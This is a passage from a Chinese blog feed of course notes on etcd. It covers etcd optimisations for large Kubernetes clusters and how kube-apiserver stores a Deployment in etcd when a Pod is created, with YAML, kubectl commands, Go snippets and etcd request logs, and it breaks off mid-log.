key-value大小限制的。</p><p>在成千上万个节点的集群中，一个服务可能背后有上万个Pod。而服务对应的Endpoints资源含有大量的独立的endpoints信息，这会导致Endpoints资源大小达到etcd的value大小限制，etcd拒绝更新。</p><p>另外，kube-proxy等组件会实时监听Endpoints资源，一个endpoint变化就会产生较大的流量，导致kube-apiserver等组件流量超大、出现一系列性能瓶颈。</p><p>如何解决以上Endpoints资源过大的问题呢？</p><p>答案依然是<strong>拆分、化大为小</strong>。Kubernetes社区设计了EndpointSlice概念，每个EndpointSlice最大支持保存100个endpoints，成功解决了key-value过大、变更同步导致流量超大等一系列瓶颈。</p><h2 id="etcd优化"><a href="#etcd优化" class="headerlink" title="etcd优化"></a>etcd优化</h2><p>Kubernetes社区在解决大集群的挑战的同时，etcd社区也在不断优化、新增特性，提升etcd在Kubernetes场景下的稳定性和性能。这里简单列举两个，一个是etcd并发读特性，一个是Watch特性的Notify机制。</p><h3 id="并发读特性"><a href="#并发读特性" class="headerlink" title="并发读特性"></a>并发读特性</h3><p>通过以上介绍的各种机制、策略，虽然Kubernetes能大大缓解expensive read request问题，但是它并不是从本质上来解决问题的。</p><p>为什么etcd无法支持大量的read expensive request呢？</p><p>除了一直强调的容易导致OOM、大流量导致丢包外，etcd根本性瓶颈是在etcd 3.4版本之前，expensive read request会长时间持有MVCC模块的buffer读锁RLock。而写请求执行完后，需升级锁至Lock，expensive request导致写事务阻塞在升级锁过程中，最终导致写请求超时。</p><p>为了解决此问题，etcd 3.4版本实现了并发读特性。核心解决方案是去掉了读写锁，每个读事务拥有一个buffer。在收到读请求创建读事务对象时，全量拷贝写事务维护的buffer到读事务buffer中。</p><p>通过并发读特性，显著降低了List Pod和CRD等expensive read request对写性能的影响，延时不再突增、抖动。</p><h3 id="改善Watch-Notify机制"><a href="#改善Watch-Notify机制" class="headerlink" title="改善Watch Notify机制"></a>改善Watch Notify机制</h3><p>为了配合Kubernetes社区实现更高效的Watch恢复机制，etcd改善了Watch Notify机制，早期Notify消息发送间隔是固定的10分钟。</p><p>在etcd 3.4.11版本中，新增了–experimental-watch-progress-notify-interval参数使Notify间隔时间可配置，最小支持为100ms，满足了Kubernetes业务场景的诉求。</p><p>最后，要注意的是，默认通过clientv3 Watch API创建的watcher是不会开启此特性的。需要创建Watcher的时候，设置clientv3.WithProgressNotify选项，这样etcd server就会定时发送提醒消息给client，消息中就会携带etcd当前最新的全局版本号。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>首先剖析了大集群核心问题，即expensive request、db size、key-value大小。</p><p>针对expensive request，阐述了Kubernetes的分页机制、资源按namespace拆分部署策略、核心的Informer机制、优化client与kube-apiserver连接异常后的Watch恢复效率的bookmark机制、以及进一步优化kube-apiserver重建场景下Watch恢复效率的Notify机制。从这个问题优化思路中可以看到，优化无止境。从大方向到边界问题，Kubernetes社区一步步将expensive request降低到极致。</p><p>针对db size和key-value大小，Kubernetes社区的解决方案核心思想是拆分，通过Lease和EndpointSlice资源对象成功解决了大规模集群过程遇到db size和key-value瓶颈。</p><p>最后etcd社区也在努力提升、优化相关特性，etcd 3.4版本中的并发读特性和可配置化的Watch Notify间隔时间就是最典型的案例。自从etcd被redhat捐赠给CNCF后，etcd核心就围绕着Kubernetes社区展开工作，努力打造更快、更稳的etcd。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>19.Kubernetes基础应用：创建一个Pod背后etcd发生了什么？</title>
    <link href="/2022/10/15/19-Kubernetes%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8%EF%BC%9A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAPod%E8%83%8C%E5%90%8Eetcd%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <url>/2022/10/15/19-Kubernetes%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8%EF%BC%9A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAPod%E8%83%8C%E5%90%8Eetcd%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="19-Kubernetes基础应用：创建一个Pod背后etcd发生了什么？"><a href="#19-Kubernetes基础应用：创建一个Pod背后etcd发生了什么？" class="headerlink" title="19.Kubernetes基础应用：创建一个Pod背后etcd发生了什么？"></a>19.Kubernetes基础应用：创建一个Pod背后etcd发生了什么？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>今天我们通过在Kubernetes集群中创建一个Pod的案例，分析etcd在其中发挥的作用，深入了解Kubernetes是如何使用etcd的。</p><h2 id="Kubernetes基础架构"><a href="#Kubernetes基础架构" class="headerlink" title="Kubernetes基础架构"></a>Kubernetes基础架构</h2><p>在详细了解etcd在Kubernetes里的应用之前，先简单介绍下Kubernetes集群的整体架构，搞清楚etcd在Kubernetes集群中扮演的角色与作用。</p><p>下图是Kubernetes集群的架构图（ <a href="https://kubernetes.io/docs/concepts/overview/components/">引用自Kubernetes官方文档</a>），从图中你可以看到，它由Master节点和Node节点组成。</p><p><img src="https://static001.geekbang.org/resource/image/b1/c0/b13d665a0e5be852c050d09c8602e4c0.png?wh=1920*831" alt="img"></p><p>控制面Master节点主要包含以下组件：</p><ul><li>kube-apiserver，负责对外提供集群各类资源的增删改查及Watch接口，它是Kubernetes集群中各组件数据交互和通信的枢纽。kube-apiserver在设计上可水平扩展，高可用Kubernetes集群中一般多副本部署。当收到一个创建Pod写请求时，它的基本流程是对请求进行认证、限速、授权、准入机制等检查后，写入到etcd即可。</li><li>kube-scheduler是调度器组件，负责集群Pod的调度。基本原理是通过监听kube-apiserver获取待调度的Pod，然后基于一系列筛选和评优算法，为Pod分配最佳的Node节点。</li><li>kube-controller-manager包含一系列的控制器组件，比如Deployment、StatefulSet等控制器。控制器的核心思想是监听、比较资源实际状态与期望状态是否一致，若不一致则进行协调工作使其最终一致。</li><li>etcd组件，Kubernetes的元数据存储。</li></ul><p>Node节点主要包含以下组件：</p><ul><li>kubelet，部署在每个节点上的Agent的组件，负责Pod的创建运行。基本原理是通过监听APIServer获取分配到其节点上的Pod，然后根据Pod的规格详情，调用运行时组件创建pause和业务容器等。</li><li>kube-proxy，部署在每个节点上的网络代理组件。基本原理是通过监听APIServer获取Service、Endpoint等资源，基于Iptables、IPVS等技术实现数据包转发等功能。</li></ul><p>从Kubernetes基础架构介绍中可以看到，kube-apiserver是唯一直接与etcd打交道的组件，各组件都通过kube-apiserver实现数据交互，它们极度依赖kube-apiserver提供的资源变化 <strong>监听机制</strong>。而kube-apiserver对外提供的监听机制，也正是etcd <strong>Watch特性</strong> 提供的底层支持。</p><h2 id="创建Pod案例"><a href="#创建Pod案例" class="headerlink" title="创建Pod案例"></a>创建Pod案例</h2><p>接下来就以在Kubernetes集群中创建一个nginx服务为例，通过这个案例来详细分析etcd在Kubernetes集群创建Pod背后是如何工作的。</p><p>下面是创建一个nginx服务的YAML文件，Workload是Deployment，期望的副本数是1。</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">apiVersion</span><span class="hljs-punctuation">:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attribute">kind</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx-deployment</span><br>  <span class="hljs-attribute">labels</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">app</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attribute">spec</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">replicas</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>  <span class="hljs-attribute">selector</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">matchLabels</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">app</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attribute">template</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">labels</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">app</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attribute">spec</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">containers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">name: nginx</span><br>        <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx:1.14.2</span><br>        <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">containerPort: 80</span><br><br></code></pre></td></tr></table></figure><p>假设此YAML文件名为nginx.yaml，首先通过如下的kubectl create -f nginx.yml命令创建Deployment资源。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> kubectl create <span class="hljs-operator">-f</span> nginx.yml<br>deployment.apps/nginx<span class="hljs-literal">-deployment</span> created<br><br></code></pre></td></tr></table></figure><p>创建之后，我们立刻通过如下命令，带标签查询Pod，输出如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ kubectl <span class="hljs-built_in">get</span> po -l <span class="hljs-attribute">app</span>=nginx<br>NAME                                READY   STATUS    RESTARTS   AGE<br>nginx-deployment-756d9fd5f9-fkqnf   1/1     Running   0          8s<br><br></code></pre></td></tr></table></figure><p>那么在kubectl create命令发出，nginx Deployment资源成功创建的背后，kube-apiserver是如何与etcd打交道的呢？ 它是通过什么接口 <strong>安全写入</strong> 资源到etcd的？</p><p>同时，使用kubectl带标签查询Pod背后，kube-apiserver是直接从 <strong>缓存读取</strong> 还是向etcd发出一个 <strong>线性读</strong> 或 <strong>串行读</strong> 请求呢？ 若同namespace下存在大量的Pod，此操作性能又是怎样的呢?</p><p>接下来聊聊kube-apiserver收到创建和查询请求后，是如何与etcd交互的。</p><h2 id="kube-apiserver请求执行链路"><a href="#kube-apiserver请求执行链路" class="headerlink" title="kube-apiserver请求执行链路"></a>kube-apiserver请求执行链路</h2><p>kube-apiserver作为Kubernetes集群交互的枢纽、对外提供API供用户访问的组件，因此保障集群安全、保障本身及后端etcd的稳定性的等重任也是非它莫属。比如校验创建请求发起者是否合法、是否有权限操作相关资源、是否出现Bug产生大量写和读请求等。</p><p><a href="https://speakerdeck.com/sttts/kubernetes-api-codebase-tour?slide=18">下图是kube-apiserver的请求执行链路</a>（引用自sttts分享的PDF），当收到一个请求后，它主要经过以下处理链路来完成以上若干职责后，才能与etcd交互。</p><p>核心链路如下：</p><ul><li>认证模块，校验发起的请求的用户身份是否合法。支持多种方式，比如x509客户端证书认证、静态token认证、webhook认证等。</li><li>限速模块，对请求进行简单的限速，默认读400&#x2F;s写200&#x2F;s，不支持根据请求类型进行分类、按优先级限速，存在较多问题。Kubernetes 1.19后已新增Priority and Fairness特性取代它，它支持将请求重要程度分类进行限速，支持多租户，可有效保障Leader选举之类的高优先级请求得到及时响应，能防止一个异常client导致整个集群被限速。</li><li>审计模块，可记录用户对资源的详细操作行为。</li><li>授权模块，检查用户是否有权限对其访问的资源进行相关操作。支持多种方式，RBAC(Role-based access control)、ABAC(Attribute-based access control)、Webhhook等。Kubernetes 1.12版本后，默认授权机制使用的RBAC。</li><li>准入控制模块，提供在访问资源前拦截请求的静态和动态扩展能力，比如要求镜像的拉取策略始终为AlwaysPullImages。</li></ul><p><img src="https://static001.geekbang.org/resource/image/56/bc/561f38086df49d17ee4e12ec3c5220bc.png?wh=1920*1078" alt="img"></p><p>经过上面一系列的模块检查后，这时kube-apiserver就开始与etcd打交道了。在了解kube-apiserver如何将我们创建的Deployment资源写入到etcd前，先介绍下Kubernetes的资源是如何组织、存储在etcd中。</p><h2 id="Kubernetes资源存储格式"><a href="#Kubernetes资源存储格式" class="headerlink" title="Kubernetes资源存储格式"></a>Kubernetes资源存储格式</h2><p>etcd仅仅是个key-value存储，但是在Kubernetes中存在各种各样的资源，并提供了以下几种灵活的资源查询方式：</p><ul><li>按具体资源名称查询，比如PodName、kubectl get po&#x2F;PodName。</li><li>按namespace查询，获取一个namespace下的所有Pod，比如kubectl get po -n kube-system。</li><li>按标签名，标签是极度灵活的一种方式，你可以为你的Kubernetes资源打上各种各样的标签，比如上面案例中的kubectl get po -l app&#x3D;nginx。</li></ul><p>你知道以上这几种查询方式它们的性能优劣吗？假设你是Kubernetes开发者，你会如何设计存储格式来满足以上功能点？</p><p>首先是按具体资源名称查询。它本质就是个key-value查询，只需要写入etcd的key名称与资源key一致即可。</p><p>其次是按namespace查询。这种查询也并不难。因为我们知道etcd支持范围查询，若key名称前缀包含namespace、资源类型，查询的时候指定namespace和资源类型的组合的最小开始区间、最大结束区间即可。</p><p>最后是标签名查询。这种查询方式非常灵活，业务可随时添加、删除标签，各种标签可相互组合。实现标签查询的办法主要有以下两种：</p><ul><li>方案一，在etcd中存储标签数据，实现通过标签可快速定位（时间复杂度O(1)）到具体资源名称。然而一个标签可能容易实现，但是在Kubernetes集群中，它支持按各个标签组合查询，各个标签组合后的数量相当庞大。在etcd中维护各种标签组合对应的资源列表，会显著增加kube-apiserver的实现复杂度，导致更频繁的etcd写入。</li><li>方案二，在etcd中不存储标签数据，而是由kube-apiserver通过范围遍历etcd获取原始数据，然后基于用户指定标签，来筛选符合条件的资源返回给client。此方案优点是实现简单，但是大量标签查询可能会导致etcd大流量等异常情况发生。</li></ul><p>那么Kubernetes集群选择的是哪种实现方式呢?</p><p>下面是一个Kubernetes集群中的coredns一系列资源在etcd中的存储格式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/registry/</span>clusterrolebindings/system:coredns<br><span class="hljs-regexp">/registry/</span>clusterroles/system:coredns<br><span class="hljs-regexp">/registry/</span>configmaps<span class="hljs-regexp">/kube-system/</span>coredns<br><span class="hljs-regexp">/registry/</span>deployments<span class="hljs-regexp">/kube-system/</span>coredns<br><span class="hljs-regexp">/registry/</span>events<span class="hljs-regexp">/kube-system/</span>coredns-<span class="hljs-number">7</span>fcc6d65dc-<span class="hljs-number">6</span>njlg.<span class="hljs-number">1662</span>c287aabf742b<br><span class="hljs-regexp">/registry/</span>events<span class="hljs-regexp">/kube-system/</span>coredns-<span class="hljs-number">7</span>fcc6d65dc-<span class="hljs-number">6</span>njlg.<span class="hljs-number">1662</span>c288232143ae<br><span class="hljs-regexp">/registry/</span>pods<span class="hljs-regexp">/kube-system/</span>coredns-<span class="hljs-number">7</span>fcc6d65dc-jvj26<br><span class="hljs-regexp">/registry/</span>pods<span class="hljs-regexp">/kube-system/</span>coredns-<span class="hljs-number">7</span>fcc6d65dc-mgvtb<br><span class="hljs-regexp">/registry/</span>pods<span class="hljs-regexp">/kube-system/</span>coredns-<span class="hljs-number">7</span>fcc6d65dc-whzq9<br><span class="hljs-regexp">/registry/</span>replicasets<span class="hljs-regexp">/kube-system/</span>coredns-<span class="hljs-number">7</span>fcc6d65dc<br><span class="hljs-regexp">/registry/</span>secrets<span class="hljs-regexp">/kube-system/</span>coredns-token-hpqbt<br><span class="hljs-regexp">/registry/</span>serviceaccounts<span class="hljs-regexp">/kube-system/</span>coredns<br><br></code></pre></td></tr></table></figure><p>从中我们可以看到，一方面Kubernetes资源在etcd中的存储格式由prefix + “&#x2F;“ + 资源类型 + “&#x2F;“ + namespace + “&#x2F;“ + 具体资源名组成，基于etcd提供的范围查询能力，非常简单地支持了按具体资源名称查询和namespace查询。</p><p>kube-apiserver提供了如下参数给你配置etcd prefix，并支持将资源存储在多个etcd集群。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">--etcd-prefix string     Default: &quot;/registry&quot;</span><br>The prefix <span class="hljs-built_in">to</span> prepend <span class="hljs-built_in">to</span> all resource paths <span class="hljs-keyword">in</span> etcd.<br><span class="hljs-comment">--etcd-servers stringSlice</span><br>List <span class="hljs-keyword">of</span> etcd servers <span class="hljs-built_in">to</span> connect <span class="hljs-keyword">with</span> (scheme://ip:port), <span class="hljs-literal">comma</span> separated.<br><span class="hljs-comment">--etcd-servers-overrides stringSlice</span><br>Per-resource etcd servers overrides, <span class="hljs-literal">comma</span> separated. The individual override <span class="hljs-built_in">format</span>: group/resource<span class="hljs-comment">#servers, where servers are URLs,</span><br>semicolon separated.<br><br></code></pre></td></tr></table></figure><p>另一方面，我们未看到任何标签相关的key。Kubernetes实现标签查询的方式显然是方案二，即由kube-apiserver通过范围遍历etcd获取原始数据，然后基于用户指定标签，来筛选符合条件的资源返回给client（资源key的value中记录了资源YAML文件内容等，如标签）。</p><p>也就是当执行”kubectl get po -l app&#x3D;nginx”命令，按标签查询Pod时，它会向etcd发起一个范围遍历整个default namespace下的Pod操作。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ kubectl get po -l app=nginx -v <span class="hljs-number">8</span><br>I0301 <span class="hljs-number">23</span>:<span class="hljs-number">45</span>:<span class="hljs-number">25.597465</span>   <span class="hljs-number">32411</span> loader.go:<span class="hljs-number">359</span>] Config loaded from file <span class="hljs-regexp">/root/</span>.kube/config<br>I0301 <span class="hljs-number">23</span>:<span class="hljs-number">45</span>:<span class="hljs-number">25.603182</span>   <span class="hljs-number">32411</span> round_trippers.go:<span class="hljs-number">416</span>] GET https:<span class="hljs-regexp">//i</span>p:port<span class="hljs-regexp">/api/</span>v1<span class="hljs-regexp">/namespaces/</span>default/pods?<br>labelSelector=app%<span class="hljs-number">3</span>Dnginx&amp;limit=<span class="hljs-number">500</span><br><br></code></pre></td></tr></table></figure><p>etcd收到的请求日志如下，由此可见当一个namespace存在大量Pod等资源时，若频繁通过kubectl，使用标签查询Pod等资源，后端etcd将出现较大的压力。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;debug&quot;</span></span>,<br>    <span class="hljs-string">&quot;ts&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-03-01T23:45:25.609+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;caller&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;v3rpc/interceptor.go:181&quot;</span></span>,<br>    <span class="hljs-string">&quot;msg&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;request stats&quot;</span></span>,<br>    <span class="hljs-string">&quot;start time&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-03-01T23:45:25.608+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;time spent&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;1.414135ms&quot;</span></span>,<br>    <span class="hljs-string">&quot;remote&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;127.0.0.1:44664&quot;</span></span>,<br>    <span class="hljs-string">&quot;response type&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/etcdserverpb.KV/Range&quot;</span></span>,<br>    <span class="hljs-string">&quot;request count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;request size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">61</span>,<br>    <span class="hljs-string">&quot;response count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">11</span>,<br>    <span class="hljs-string">&quot;response size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">81478</span>,<br>    <span class="hljs-string">&quot;request content&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;key:&quot;</span>/registry/pods/default/<span class="hljs-string">&quot; range_end:&quot;</span>/registry/pods/default0<span class="hljs-string">&quot; limit:500 &quot;</span></span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>了解完Kubernetes资源的存储格式后，我们再看看nginx Deployment资源是如何由kube-apiserver写入etcd的。</p><h2 id="通用存储模块"><a href="#通用存储模块" class="headerlink" title="通用存储模块"></a>通用存储模块</h2><p>kube-apiserver启动的时候，会将每个资源的APIGroup、Version、Resource Handler注册到路由上。当请求经过认证、限速、授权、准入控制模块检查后，请求就会被转发到对应的资源逻辑进行处理。</p><p>同时，kube-apiserver实现了类似数据库ORM机制的通用资源存储机制，提供了对一个资源创建、更新、删除前后的hook能力，将其封装成策略接口。当你新增一个资源时，你只需要编写相应的创建、更新、删除等策略即可，不需要写任何etcd的API。</p><p>下面是kube-apiserver通用存储模块的创建流程图：</p><p><img src="https://static001.geekbang.org/resource/image/4d/09/4d8fa0f1d6afd89cf6463cf22c56b709.png?wh=1920*1178" alt="img"></p><p>从图中可以看到，创建一个资源主要由BeforeCreate、Storage.Create以及AfterCreate三大步骤组成。</p><p>当收到创建nginx Deployment请求后，通用存储模块首先会回调各个资源自定义实现的BeforeCreate策略，为资源写入etcd做一些初始化工作。</p><p>下面是Deployment资源的创建策略实现，它会进行将deployment.Generation设置为1等操作。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// PrepareForCreate clears fields that are not allowed to be set by end users on creation.</span><br>func (deploymentStrategy) <span class="hljs-built_in">PrepareForCreate</span>(ctx context<span class="hljs-selector-class">.Context</span>, obj runtime.Object) &#123;<br>   deployment := obj.(*apps.Deployment)<br>   deployment<span class="hljs-selector-class">.Status</span> = apps.DeploymentStatus&#123;&#125;<br>   deployment<span class="hljs-selector-class">.Generation</span> = <span class="hljs-number">1</span><br><br>   pod<span class="hljs-selector-class">.DropDisabledTemplateFields</span>(&amp;deployment<span class="hljs-selector-class">.Spec</span><span class="hljs-selector-class">.Template</span>, nil)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行完BeforeCreate策略后，它就会执行Storage.Create接口，也就是由它真正开始调用底层存储模块etcd3，将nginx Deployment资源对象写入etcd。</p><p>那么Kubernetes是使用etcd Put接口写入资源key-value的吗？如果是，那要如何防止同名资源并发创建被覆盖的问题？</p><h3 id="资源安全创建及更新"><a href="#资源安全创建及更新" class="headerlink" title="资源安全创建及更新"></a>资源安全创建及更新</h3><p>我们知道etcd提供了Put和Txn接口给业务添加key-value数据，但是Put接口在并发场景下若收到key相同的资源创建，就会导致被覆盖。</p><p>因此Kubernetes很显然无法直接通过etcd Put接口来写入数据。</p><p>etcd的事务接口Txn，它正是为了多key原子更新、并发操作安全性等而诞生的，它提供了丰富的冲突检查机制。</p><p>Kubernetes集群使用的正是事务Txn接口来防止并发创建、更新被覆盖等问题。当执行完BeforeCreate策略后，这时kube-apiserver就会调用Storage的模块的Create接口写入资源。1.6版本后的Kubernete集群默认使用的存储是etcd3，它的创建接口简要实现如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// Create implements storage.Interface.Create.</span><br>func (s *store) <span class="hljs-built_in">Create</span>(ctx context<span class="hljs-selector-class">.Context</span>, key string, obj, out runtime<span class="hljs-selector-class">.Object</span>, ttl uint64) error &#123;<br>   ......<br>   key = path<span class="hljs-selector-class">.Join</span>(s<span class="hljs-selector-class">.pathPrefix</span>, key)<br><br>   opts, err := s<span class="hljs-selector-class">.ttlOpts</span>(ctx, <span class="hljs-built_in">int64</span>(ttl))<br>   <span class="hljs-keyword">if</span> err != nil &#123;<br>      return err<br>   &#125;<br><br>   newData, err := s<span class="hljs-selector-class">.transformer</span><span class="hljs-selector-class">.TransformToStorage</span>(data, <span class="hljs-built_in">authenticatedDataString</span>(key))<br>   <span class="hljs-keyword">if</span> err != nil &#123;<br>      return storage<span class="hljs-selector-class">.NewInternalError</span>(err<span class="hljs-selector-class">.Error</span>())<br>   &#125;<br><br>   startTime := <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Now</span>()<br>   txnResp, err := s<span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.KV</span><span class="hljs-selector-class">.Txn</span>(ctx)<span class="hljs-selector-class">.If</span>(<br>      <span class="hljs-built_in">notFound</span>(key),<br>   )<span class="hljs-selector-class">.Then</span>(<br>      clientv3<span class="hljs-selector-class">.OpPut</span>(key, <span class="hljs-built_in">string</span>(newData), opts...),<br>   )<span class="hljs-selector-class">.Commit</span><br><br></code></pre></td></tr></table></figure><p>从上面的代码片段中，我们可以得出首先它会按照我们介绍的Kubernetes资源存储格式拼接key。</p><p>然后若TTL非0，它会根据TTL从leaseManager获取可复用的Lease ID。Kubernetes集群默认若不同key（如Kubernetes的Event资源对象）的TTL差异在1分钟内，可复用同一个Lease ID，避免大量Lease影响etcd性能和稳定性。</p><p>其次若开启了数据加密，在写入etcd前数据还将按加密算法进行转换工作。</p><p>最后就是使用etcd的Txn接口，向etcd发起一个创建deployment资源的Txn请求。</p><p>那么etcd收到kube-apiserver的请求是长什么样子的呢？</p><p>下面是etcd收到创建nginx deployment资源的请求日志：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;debug&quot;</span></span>,<br>    <span class="hljs-string">&quot;ts&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:45.914+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;caller&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;v3rpc/interceptor.go:181&quot;</span></span>,<br>    <span class="hljs-string">&quot;msg&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;request stats&quot;</span></span>,<br>    <span class="hljs-string">&quot;start time&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:45.911+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;time spent&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2.697925ms&quot;</span></span>,<br>    <span class="hljs-string">&quot;remote&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;127.0.0.1:44822&quot;</span></span>,<br>    <span class="hljs-string">&quot;response type&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/etcdserverpb.KV/Txn&quot;</span></span>,<br>    <span class="hljs-string">&quot;request count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;request size&quot;</span><span 